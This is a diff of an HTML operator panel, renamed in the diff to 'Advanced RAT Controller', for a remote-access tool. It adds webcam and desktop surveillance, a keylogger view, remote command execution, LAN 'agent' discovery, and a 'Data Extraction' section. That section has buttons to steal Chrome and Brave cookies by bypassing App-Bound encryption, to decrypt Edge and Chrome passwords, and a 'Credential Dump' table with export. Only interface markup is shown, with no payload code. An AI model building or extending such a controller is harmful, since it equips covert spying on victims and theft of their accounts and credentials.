@@ -24,17 +24,32 @@
                 <span class="dot green" title="Fullscreen"></span>
             </div>
             <div class="title-drag-area">
-                <i data-feather="command" class="app-icon"></i>
-                <span class="title-text">Remote Control Center</span>
+                <i data-feather="cpu" class="app-icon"></i>
+                <span class="title-text">Advanced RAT Controller</span>
             </div>
         </header>
 
         <div class="app-body">
             <nav id="sidebar">
                 <div class="nav-group">
-                    <span class="nav-label">Systems</span>
+                    <span class="nav-label">Surveillance</span>
                     <ul class="nav-list">
-                        <li class="nav-item active" data-view="applications">
+                        <li class="nav-item active" data-view="capture">
+                            <i data-feather="monitor"></i> <span>Desktop View</span>
+                        </li>
+                        <li class="nav-item" data-view="webcam">
+                            <i data-feather="video"></i> <span>Webcam</span>
+                        </li>
+                        <li class="nav-item" data-view="keylogger">
+                            <i data-feather="terminal"></i> <span>Keylogger</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="nav-group">
+                    <span class="nav-label">System Manager</span>
+                    <ul class="nav-list">
+                        <li class="nav-item" data-view="applications">
                             <i data-feather="grid"></i> <span>Applications</span>
                         </li>
                         <li class="nav-item" data-view="processes">
@@ -44,24 +59,18 @@
                 </div>
 
                 <div class="nav-group">
-                    <span class="nav-label">Tools</span>
+                    <span class="nav-label">Red Team Ops</span>
                     <ul class="nav-list">
-                        <li class="nav-item" data-view="capture">
-                            <i data-feather="camera"></i> <span>Screen</span>
-                        </li>
-                        <li class="nav-item" data-view="webcam">
-                            <i data-feather="video"></i> <span>Webcam</span>
-                        </li>
-                        <li class="nav-item" data-view="keylogger">
-                            <i data-feather="activity"></i> <span>Keylogger</span>
+                        <li class="nav-item" data-view="data-theft">
+                            <i data-feather="shield-off"></i> <span>Data Extraction</span>
                         </li>
                     </ul>
                 </div>
 
                 <div class="nav-group mt-auto">
                     <ul class="nav-list">
-                        <li class="nav-item" data-view="system-control">
-                            <i data-feather="power"></i> <span>Power & System</span>
+                        <li class="nav-item" data-view="power-control">
+                            <i data-feather="power"></i> <span>Power</span>
                         </li>
                     </ul>
                 </div>
@@ -69,107 +78,99 @@
 
             <section id="main-content">
 
-                <div class="content-view" id="view-processes">
-                    <div class="content-header">
-                        <div>
-                            <h1>Processes</h1>
-                            <p class="subtitle">Manage system tasks</p>
-                        </div>
-                    </div>
-                    <div class="dashboard-grid">
-                        <div class="dash-card" data-action="show-view" data-target="processes-table">
-                            <div class="card-icon blue"><i data-feather="list"></i></div>
-                            <h3>View All Processes</h3>
-                            <p>Monitor and manage running tasks</p>
-                        </div>
-                        <div class="dash-card" onclick="document.getElementById('btn-start-process').click()">
-                            <div class="card-icon green"><i data-feather="plus-square"></i></div>
-                            <h3>Start New Task</h3>
-                            <p>Run a new program or command</p>
-                        </div>
-                        <div class="dash-card" id="card-open-stop-procs">
-                            <div class="card-icon red"><i data-feather="activity"></i></div>
-                            <h3>Kill Process</h3>
-                            <p>Select a background process to kill</p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="content-view" id="view-processes-table" data-parent-view="processes">
+                <div class="content-view active" id="view-capture">
                     <div class="content-toolbar">
-                        <h2><i data-feather="cpu"></i> Active Processes</h2>
+                        <h2><i data-feather="monitor"></i> Screen Control</h2>
                         <div class="button-group">
-                            <button class="btn btn-primary" id="btn-start-process"><i data-feather="plus"></i> Start Process</button>
+                            <button class="btn btn-primary" id="btn-start-stream">
+                                <i data-feather="play"></i> Live Stream
+                            </button>
+                            <button class="btn btn-danger hidden" id="btn-stop-stream">
+                                <i data-feather="square"></i> Stop
+                            </button>
+
+                            <div class="divider-vertical"></div>
+                            <button class="btn btn-outline" id="btn-take-screenshot" title="Take Snapshot">
+                                <i data-feather="camera"></i> Snap
+                            </button>
+                            <button class="btn btn-text hidden" id="btn-save-screenshot" title="Download Image">
+                                <i data-feather="download"></i>
+                            </button>
+                            <button class="btn btn-text hidden" id="btn-copy-screenshot" title="Copy to Clipboard">
+                                <i data-feather="copy"></i>
+                            </button>
+
+                            <div class="divider-vertical"></div>
+                            <button class="btn btn-round-refresh" id="btn-reload-screen" title="Reset UI">
+                                <i data-feather="refresh-cw"></i>
+                            </button>
+                            
+                            <div style="display: flex; align-items: center; gap: 8px; margin-left: 12px;">
+                                <label class="toggle-switch">
+                                    <input type="checkbox" id="toggle-mouse-control">
+                                    <span class="slider"></span>
+                                </label>
+                                <span style="font-size: 13px; font-weight: 600; color: var(--text-muted);">Mouse</span>
+                            </div>
                         </div>
                     </div>
-                    <div class="table-container">
-                        <table id="processes-table">
-                            <thead>
-                                <tr>
-                                    <th>PID</th>
-                                    <th>Name</th>
-                                    <th>Memory</th>
-                                    <th class="text-right">Action</th>
-                                </tr>
-                            </thead>
-                            <tbody></tbody>
-                        </table>
+                    
+                    <div id="capture-display-area">
+                        <div class="empty-state">
+                            <div class="empty-icon"><i data-feather="image"></i></div>
+                            <p id="capture-placeholder">Ready to capture or stream</p>
+                            <div id="capture-spinner" class="spinner hidden"></div>
+                        </div>
+                        <img id="capture-img" src="" alt="Snapshot" class="hidden shadow-lg">
+                        <img id="stream-img" class="hidden shadow-lg" alt="Live Stream">
                     </div>
                 </div>
 
-                <div class="content-view active" id="view-applications">
-                    <div class="content-header">
-                        <div>
-                            <h1>Applications</h1>
-                            <p class="subtitle">Desktop applications</p>
-                        </div>
-                    </div>
-                    <div class="dashboard-grid">
-                        <div class="dash-card" data-action="show-view" data-target="applications-table">
-                            <div class="card-icon purple"><i data-feather="layers"></i></div>
-                            <h3>Running Apps</h3>
-                            <p>See windowed applications</p>
-                        </div>
-                        <div class="dash-card" onclick="document.getElementById('btn-start-app').click()">
-                            <div class="card-icon green"><i data-feather="play"></i></div>
-                            <h3>Launch App</h3>
-                            <p>Open a program by name</p>
-                        </div>
-                        <div class="dash-card" id="card-open-stop-apps">
-                            <div class="card-icon red"><i data-feather="x-square"></i></div>
-                            <h3>Stop Application</h3>
-                            <p>Select an active app to force quit</p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="content-view" id="view-applications-table" data-parent-view="applications">
+                <div class="content-view" id="view-webcam">
                     <div class="content-toolbar">
-                        <h2><i data-feather="grid"></i> Applications</h2>
+                        <h2><i data-feather="video"></i> Webcam Surveillance</h2>
                         <div class="button-group">
-                            <button class="btn btn-primary" id="btn-start-app"><i data-feather="plus"></i> Start App</button>
+                            <button class="btn btn-primary" id="btn-start-webcam-stream">
+                                <i data-feather="play"></i> Live Stream
+                            </button>
+                            <button class="btn btn-danger hidden" id="btn-stop-webcam-stream">
+                                <i data-feather="square"></i> Stop
+                            </button>
+
+                            <div class="divider-vertical"></div>
+                            <button class="btn btn-outline" id="btn-start-record">
+                                <i data-feather="disc"></i> Record (10s)
+                            </button>
+                            <button class="btn btn-danger hidden" id="btn-stop-record">
+                                <i data-feather="square"></i> Stop Rec
+                            </button>
+                            <button class="btn btn-text hidden" id="btn-save-video" title="Download Video">
+                                <i data-feather="download"></i>
+                            </button>
+
+                            <button class="btn btn-round-refresh" id="btn-reload-webcam" title="Reset UI">
+                                <i data-feather="refresh-cw"></i>
+                            </button>
                         </div>
                     </div>
-                    <div class="table-container">
-                        <table id="apps-table">
-                            <thead>
-                                <tr>
-                                    <th>Name</th>
-                                    <th>Instances</th>
-                                    <th class="text-right">Action</th>
-                                </tr>
-                            </thead>
-                            <tbody></tbody>
-                        </table>
+                    <div id="webcam-display-area">
+                        <div class="empty-state">
+                            <div class="empty-icon"><i data-feather="film"></i></div>
+                            <p id="webcam-placeholder">Waiting for camera stream...</p>
+                            <p id="webcam-status" class="status-text hidden">Idle</p>
+                            <div id="webcam-spinner" class="spinner hidden"></div>
+                        </div>
+                        <img id="webcam-stream-img" class="hidden shadow-lg" alt="Webcam Stream">
+                        <video id="webcam-video-output" controls class="hidden shadow-lg"></video>
                     </div>
                 </div>
 
                 <div class="content-view" id="view-keylogger">
                     <div class="content-toolbar">
-                        <h2>Keylogger Monitor</h2>
+                        <h2><i data-feather="terminal"></i> Live Keylogger</h2>
                         <div class="toolbar-actions">
-                            <button class="btn btn-sm btn-outline" id="btn-clear-keylog" title="Clear logs">
-                                <i data-feather="trash-2"></i> <span>Clear</span>
+                            <button class="btn btn-sm btn-outline" id="btn-clear-keylog">
+                                <i data-feather="trash-2"></i> Clear
                             </button>
                             <div class="divider-vertical"></div>
                             <label class="toggle-switch">
@@ -182,107 +183,148 @@
                         <div class="terminal-header">
                             <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                         </div>
-                        <pre id="keylog-output">System ready. Waiting for input stream...</pre>
+                        <pre id="keylog-output">Keylogger ready. Toggle switch to start listening...</pre>
                     </div>
                 </div>
 
-                <div class="content-view" id="view-capture">
-                    <div class="content-toolbar">
-                        <h2>Screen</h2>
-                        <div class="button-group">
-                            <button class="btn btn-primary" id="btn-take-screenshot">
-                                <i data-feather="camera"></i> Capture
-                            </button>
-                            
-                            <button class="btn btn-primary" id="btn-start-stream">
-                                <i data-feather="play"></i> Stream
-                            </button>
-
-                            <button class="btn btn-danger hidden" id="btn-stop-stream">
-                                <i data-feather="square"></i> Stop
-                            </button>
-
-                            <button class="btn btn-outline hidden" id="btn-save-screenshot">
-                                <i data-feather="download"></i> Save
-                            </button>
-
-                            <button class="btn btn-outline hidden" id="btn-copy-screenshot">
-                                <i data-feather="copy"></i> Copy
-                            </button>
-
-                            <button class="btn btn-round-refresh" id="btn-reload-screen" title="Reset UI">
-                                <i data-feather="refresh-cw"></i>
-                            </button>
-                        </div>
-                    </div>
-                    <div id="capture-display-area">
-                        <div class="empty-state">
-                            <div class="empty-icon"><i data-feather="image"></i></div>
-                            <p id="capture-placeholder">Ready to capture/stream screen</p>
-                            <div id="capture-spinner" class="spinner hidden"></div>
-                        </div>
-                        <img id="capture-img" src="" alt="Screen" class="hidden shadow-lg">
-                        <img id="stream-img" class="hidden shadow-lg" alt="Screen Stream">
-                    </div>
-                </div>
-
-                <div class="content-view" id="view-webcam">
-                    <div class="content-toolbar">
-                        <h2>Webcam Recorder</h2>
-                        <div class="button-group">
-                            <button class="btn btn-primary" id="btn-start-record">
-                                <i data-feather="video"></i> Record Clip
-                            </button>
-
-                            <button class="btn btn-danger hidden" id="btn-stop-record">
-                                <i data-feather="square"></i> Stop Record
-                            </button>
-
-                            <button class="btn btn-primary" id="btn-start-webcam-stream">
-                                <i data-feather="play"></i> Stream
-                            </button>
-
-                            <button class="btn btn-danger hidden" id="btn-stop-webcam-stream">
-                                <i data-feather="square"></i> Stop Stream
-                            </button>
-
-                            <button class="btn btn-outline hidden" id="btn-save-video">
-                                <i data-feather="download"></i> Save
-                            </button>
-
-                            <button class="btn btn-round-refresh" id="btn-reload-webcam" title="Reset UI">
-                                <i data-feather="refresh-cw"></i>
-                            </button>
-                        </div>
-                    </div>
-                    <div id="webcam-display-area">
-                        <div class="empty-state">
-                            <div class="empty-icon"><i data-feather="film"></i></div>
-                            <p id="webcam-placeholder">Ready to record or stream webcam</p>
-                            <p id="webcam-status" class="status-text hidden">Idle</p>
-                            <div id="webcam-spinner" class="spinner hidden"></div>
-                        </div>
-                        <img id="webcam-stream-img" class="hidden shadow-lg" alt="Webcam Stream"> <video id="webcam-video-output" controls class="hidden shadow-lg"></video>
-                    </div>
-                </div>
-
-                <div class="content-view" id="view-system-control">
+                <div class="content-view" id="view-applications">
                     <div class="content-header">
-                        <div>
-                            <h1>System Control</h1>
-                            <p class="subtitle">Power management & Server actions</p>
-                        </div>
+                        <h1>Applications</h1>
+                        <p class="subtitle">Manage visible windows</p>
                     </div>
                     <div class="dashboard-grid">
-                        <div class="dash-card danger" id="btn-system-restart">
-                            <div class="card-icon red"><i data-feather="rotate-cw"></i></div>
+                        <div class="dash-card" data-action="show-view" data-target="applications-table">
+                            <div class="card-icon purple"><i data-feather="list"></i></div>
+                            <h3>View App List</h3>
+                            <p>See all active windows</p>
+                        </div>
+                        <div class="dash-card" onclick="document.getElementById('btn-start-app').click()">
+                            <div class="card-icon green"><i data-feather="play"></i></div>
+                            <h3>Launch App</h3>
+                            <p>Start program by name</p>
+                        </div>
+                        <div class="dash-card" id="card-open-stop-apps">
+                            <div class="card-icon red"><i data-feather="x-circle"></i></div>
+                            <h3>Force Quit</h3>
+                            <p>Kill application</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="content-view" id="view-applications-table" data-parent-view="applications">
+                    <div class="content-toolbar">
+                        <h2><i data-feather="grid"></i> Running Applications</h2>
+                        <button class="btn btn-primary" id="btn-start-app"><i data-feather="plus"></i> Start App</button>
+                    </div>
+                    <div class="table-container">
+                        <table id="apps-table">
+                            <thead>
+                                <tr><th>Name</th><th>Instances</th><th class="text-right">Action</th></tr>
+                            </thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="content-view" id="view-processes">
+                    <div class="content-header">
+                        <h1>Processes</h1>
+                        <p class="subtitle">System task manager</p>
+                    </div>
+                    <div class="dashboard-grid">
+                        <div class="dash-card" data-action="show-view" data-target="processes-table">
+                            <div class="card-icon blue"><i data-feather="cpu"></i></div>
+                            <h3>Task Manager</h3>
+                            <p>View all background processes</p>
+                        </div>
+                        <div class="dash-card" onclick="document.getElementById('btn-start-process').click()">
+                            <div class="card-icon green"><i data-feather="terminal"></i></div>
+                            <h3>Execute</h3>
+                            <p>Run command or path</p>
+                        </div>
+                        <div class="dash-card" id="card-open-stop-procs">
+                            <div class="card-icon red"><i data-feather="activity"></i></div>
+                            <h3>Kill PID</h3>
+                            <p>Terminate process by ID</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="content-view" id="view-processes-table" data-parent-view="processes">
+                    <div class="content-toolbar">
+                        <h2><i data-feather="cpu"></i> Active Processes</h2>
+                        <button class="btn btn-primary" id="btn-start-process"><i data-feather="play"></i> Run</button>
+                    </div>
+                    <div class="table-container">
+                        <table id="processes-table">
+                            <thead>
+                                <tr><th>PID</th><th>Name</th><th>Memory</th><th class="text-right">Action</th></tr>
+                            </thead>
+                            <tbody></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="content-view" id="view-data-theft">
+                    <div class="content-header">
+                        <div style="display: flex; align-items: center; gap: 15px;">
+                            <h1 style="color: #ef4444;">Data Extraction</h1>
+                            <span class="status-pill disconnected" style="font-size: 10px;">Admin Only</span>
+                        </div>
+                        <p class="subtitle">Credential dumping & Session Hijacking</p>
+                    </div>
+                    
+                    <div class="dashboard-grid">
+                        <div class="dash-card" onclick="requestStealCookies('brave')">
+                            <div class="card-icon" style="background: linear-gradient(135deg, #ff512f, #dd2476);">
+                                <i data-feather="chrome"></i>
+                            </div>
+                            <h3>Brave Cookies</h3>
+                            <p>Bypass App-Bound (CDP Method)</p>
+                        </div>
+
+                        <div class="dash-card" onclick="requestStealCookies('chrome')">
+                            <div class="card-icon" style="background: linear-gradient(135deg, #fce38a, #f38181);">
+                                <i data-feather="chrome"></i>
+                            </div>
+                            <h3>Chrome Cookies</h3>
+                            <p>Bypass App-Bound (CDP Method)</p>
+                        </div>
+
+                        <div class="dash-card" onclick="requestStealPass('edge')">
+                            <div class="card-icon" style="background: linear-gradient(135deg, #00c6ff, #0072ff);">
+                                <i data-feather="key"></i>
+                            </div>
+                            <h3>Edge Passwords</h3>
+                            <p>Decrypt Login Data (Standard)</p>
+                        </div>
+
+                        <div class="dash-card" onclick="requestStealPass('chrome')">
+                            <div class="card-icon" style="background: linear-gradient(135deg, #11998e, #38ef7d);">
+                                <i data-feather="key"></i>
+                            </div>
+                            <h3>Chrome Passwords</h3>
+                            <p>Try Decrypt (Legacy Mode)</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="content-view" id="view-power-control">
+                    <div class="content-header">
+                        <h1>Power Options</h1>
+                        <p class="subtitle">Remote system state</p>
+                    </div>
+                    <div class="dashboard-grid">
+                        <div class="dash-card" id="btn-system-restart">
+                            <div class="card-icon blue"><i data-feather="refresh-ccw"></i></div>
                             <h3>Restart System</h3>
                             <p>Reboot the remote machine immediately</p>
                         </div>
-                        <div class="dash-card danger" id="btn-system-shutdown">
+
+                        <div class="dash-card" id="btn-system-shutdown">
                             <div class="card-icon red"><i data-feather="power"></i></div>
-                            <h3>Shutdown System</h3>
-                            <p>Power off the remote machine immediately</p>
+                            <h3>Shutdown</h3>
+                            <p>Turn off the remote machine</p>
                         </div>
                     </div>
                 </div>
@@ -297,7 +339,7 @@
                     <span class="status-text">Disconnected</span>
                 </div>
                 
-                <button id="btn-scan-lan" title="Scan Local Network">
+                <button id="btn-scan-lan" title="Radar Scan (Auto Discovery)">
                     <i data-feather="wifi"></i>
                 </button>
 
@@ -320,40 +362,40 @@
 
     <div id="modal-start-process" class="modal styled-modal hidden">
         <div class="modal-header">
-            <div class="icon-box blue"><i data-feather="cpu"></i></div>
+            <div class="icon-box blue"><i data-feather="terminal"></i></div>
             <div class="header-text">
-                <h2>Start Process</h2>
-                <p>Execute a new program</p>
+                <h2>Run Command</h2>
+                <p>Execute process on remote machine</p>
             </div>
         </div>
         <div class="modal-body">
             <div class="input-group">
-                <label>Executable Path</label>
-                <div class="input-wrapper"><i data-feather="folder"></i><input type="text" id="input-proc-path" placeholder="C:\Windows\notepad.exe"></div>
+                <label>Path / Command</label>
+                <div class="input-wrapper"><i data-feather="chevron-right"></i><input type="text" id="input-proc-path" placeholder="cmd.exe"></div>
             </div>
             <div class="input-group">
-                <label>Arguments (Optional)</label>
-                <div class="input-wrapper"><i data-feather="terminal"></i><input type="text" id="input-proc-args" placeholder="file.txt"></div>
+                <label>Arguments</label>
+                <div class="input-wrapper"><i data-feather="more-horizontal"></i><input type="text" id="input-proc-args" placeholder="/c calc"></div>
             </div>
         </div>
         <div class="modal-actions">
             <button class="btn btn-text" data-action="cancel">Cancel</button>
-            <button class="btn btn-primary" data-action="confirm">Run Process</button>
+            <button class="btn btn-primary" data-action="confirm">Execute</button>
         </div>
     </div>
 
     <div id="modal-start-app" class="modal styled-modal hidden">
         <div class="modal-header">
-            <div class="icon-box purple"><i data-feather="grid"></i></div>
+            <div class="icon-box green"><i data-feather="grid"></i></div>
             <div class="header-text">
-                <h2>Launch Application</h2>
-                <p>Start a known application</p>
+                <h2>Launch App</h2>
+                <p>Open known application</p>
             </div>
         </div>
         <div class="modal-body">
             <div class="input-group">
-                <label>Application Name</label>
-                <div class="input-wrapper"><i data-feather="search"></i><input type="text" id="input-app-name" placeholder="chrome.exe"></div>
+                <label>App Name</label>
+                <div class="input-wrapper"><i data-feather="search"></i><input type="text" id="input-app-name" placeholder="notepad"></div>
             </div>
         </div>
         <div class="modal-actions">
@@ -364,95 +406,128 @@
 
     <div id="modal-webcam-device" class="modal styled-modal hidden">
         <div class="modal-header">
-            <div class="icon-box green"><i data-feather="video"></i></div>
+            <div class="icon-box purple"><i data-feather="film"></i></div>
             <div class="header-text">
-                <h2>Record Webcam</h2>
-                <p>Capture video clip</p>
+                <h2>Record Settings</h2>
+                <p>Configure recording parameters</p>
             </div>
         </div>
         <div class="modal-body">
             <div class="input-group">
                 <label>Duration (Seconds)</label>
-                <div class="input-wrapper"><i data-feather="clock"></i><input type="number" id="input-webcam-duration" value="10" min="1"></div>
+                <div class="input-wrapper"><i data-feather="clock"></i><input type="number" id="input-webcam-duration" value="10" min="1" max="60"></div>
             </div>
             <div class="input-group">
-                <label>Device Name (Optional)</label>
-                <div class="input-wrapper"><i data-feather="monitor"></i><input type="text" id="input-webcam-device-name" placeholder="Default"></div>
+                <label>Device Name (Leave empty for default)</label>
+                <div class="input-wrapper"><i data-feather="video"></i><input type="text" id="input-webcam-device-name" placeholder="Integrated Camera"></div>
             </div>
         </div>
         <div class="modal-actions">
             <button class="btn btn-text" data-action="cancel">Cancel</button>
-            <button class="btn btn-primary" data-action="confirm">Start Recording</button>
+            <button class="btn btn-primary" data-action="confirm">Start</button>
         </div>
     </div>
 
     <div id="modal-confirm" class="modal styled-modal hidden">
         <div class="modal-header">
-            <div class="icon-box red" id="confirm-icon-box"><i data-feather="alert-triangle"></i></div>
+            <div class="icon-box red"><i data-feather="alert-triangle"></i></div>
             <div class="header-text">
-                <h2 id="confirm-title">Confirm Action</h2>
-                <p id="confirm-message">Are you sure?</p>
+                <h2 id="confirm-title">Confirm</h2>
+                <p id="confirm-message">Action required</p>
             </div>
         </div>
         <div class="modal-actions">
             <button class="btn btn-text" data-action="cancel">Cancel</button>
-            <button class="btn btn-danger" id="btn-confirm-yes">Proceed</button>
+            <button class="btn btn-danger" id="btn-confirm-yes">Confirm</button>
         </div>
     </div>
 
     <div id="modal-stop-app" class="modal styled-modal hidden">
         <div class="modal-header">
-            <div class="icon-box red"><i data-feather="x-square"></i></div>
-            <div class="header-text">
-                <h2>Force Quit App</h2>
-                <p>Select an application to terminate</p>
-            </div>
+            <div class="icon-box red"><i data-feather="x-octagon"></i></div>
+            <div class="header-text"><h2>Force Quit App</h2><p>Select application</p></div>
         </div>
         <div class="modal-body">
-            <div class="custom-list-container" id="stop-app-list">
-                <div class="list-loading">Loading apps...</div>
-            </div>
+            <div class="custom-list-container" id="stop-app-list"><div class="list-loading">Loading...</div></div>
         </div>
-        <div class="modal-actions">
-            <button class="btn btn-text" data-action="cancel">Close</button>
-        </div>
+        <div class="modal-actions"><button class="btn btn-text" data-action="cancel">Close</button></div>
     </div>
 
     <div id="modal-stop-proc" class="modal styled-modal hidden">
         <div class="modal-header">
             <div class="icon-box red"><i data-feather="activity"></i></div>
-            <div class="header-text">
-                <h2>Kill Process</h2>
-                <p>Select a process ID to terminate</p>
-            </div>
+            <div class="header-text"><h2>Kill Process</h2><p>Select PID</p></div>
         </div>
         <div class="modal-body">
-            <div class="custom-list-container" id="stop-proc-list">
-                <div class="list-loading">Loading processes...</div>
-            </div>
+            <div class="custom-list-container" id="stop-proc-list"><div class="list-loading">Loading...</div></div>
         </div>
-        <div class="modal-actions">
-            <button class="btn btn-text" data-action="cancel">Close</button>
-        </div>
+        <div class="modal-actions"><button class="btn btn-text" data-action="cancel">Close</button></div>
     </div>
 
     <div id="modal-scan-lan" class="modal styled-modal hidden">
         <div class="modal-header">
-            <div class="icon-box blue"><i data-feather="monitor"></i></div>
-            <div class="header-text">
-                <h2>Discovered Devices</h2>
-                <p>Select a machine to control</p>
-            </div>
+            <div class="icon-box blue"><i data-feather="radar"></i></div>
+            <div class="header-text"><h2>Network Radar</h2><p>Scanning for agents...</p></div>
         </div>
         <div class="modal-body">
-            <div class="custom-list-container" id="scan-list">
-                <div class="list-loading">Scanning network...</div>
-            </div>
+            <div class="custom-list-container" id="scan-list"><div class="list-loading">Scanning...</div></div>
         </div>
         <div class="modal-actions">
-            <button class="btn-scan-close" data-action="cancel">
-                <i data-feather="x"></i> Close Radar
-            </button>
+            <button class="btn-scan-close" data-action="cancel"><i data-feather="x"></i> Stop</button>
+        </div>
+    </div>
+
+    <div id="password-modal" class="modal-overlay hidden">
+        <div class="modal-container slide-in">
+            <div class="modal-header">
+                <div class="header-title">
+                    <i data-feather="unlock"></i>
+                    <span>Credential Dump</span>
+                </div>
+                <div class="header-center">
+                    <div class="search-container">
+                        <span class="search-icon"><i data-feather="search"></i></span>
+                        <input type="text" id="pass-search" class="search-input" placeholder="Search targets..." onkeyup="filterPasswords()">
+                    </div>
+                </div>
+                <button class="close-btn" onclick="closePasswordModal()">
+                    <i data-feather="x"></i>
+                </button>
+            </div>
+            
+            <div class="modal-body custom-scrollbar">
+                <table class="pass-table">
+                    <thead>
+                        <tr>
+                            <th>TARGET HOST</th>
+                            <th>IDENTITY</th>
+                            <th>SECRET</th>
+                            <th class="text-center">OP</th>
+                        </tr>
+                    </thead>
+                    <tbody id="password-list-body">
+                        </tbody>
+                </table>
+                <div id="no-results" class="hidden">
+                    <i data-feather="slash"></i>
+                    <p>NO RECORDS FOUND</p>
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <div class="footer-status">
+                    <span class="status-dot"></span>
+                    <span id="pass-count">READY</span>
+                </div>
+                <div class="footer-actions">
+                    <button class="btn-action secondary" onclick="copyAllPasswords()">
+                        <i data-feather="copy"></i> Copy All
+                    </button>
+                    <button class="btn-action primary" onclick="downloadPasswords()">
+                        <i data-feather="download-cloud"></i> Export
+                    </button>
+                </div>
+            </div>
         </div>
     </div>
 
